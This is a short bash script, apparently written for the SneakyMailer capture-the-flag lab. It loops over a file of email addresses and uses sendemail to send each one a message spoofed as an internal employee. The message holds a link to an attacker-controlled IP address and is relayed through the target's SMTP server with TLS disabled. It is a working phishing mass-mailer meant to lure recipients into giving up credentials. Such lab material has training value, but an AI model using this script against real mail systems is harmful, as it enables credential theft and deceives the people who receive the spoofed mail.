#!/bin/bash
input="/home/kali/snack/sneakymailer/emails"
while IFS= read -r line
do
  sendemail -v -f hopefuentes@sneakymailer.htb -t $line -u nothing -m "http://10.10.14.18" -s sneakycorp.htb:25 -o tls=no
done < "$input"
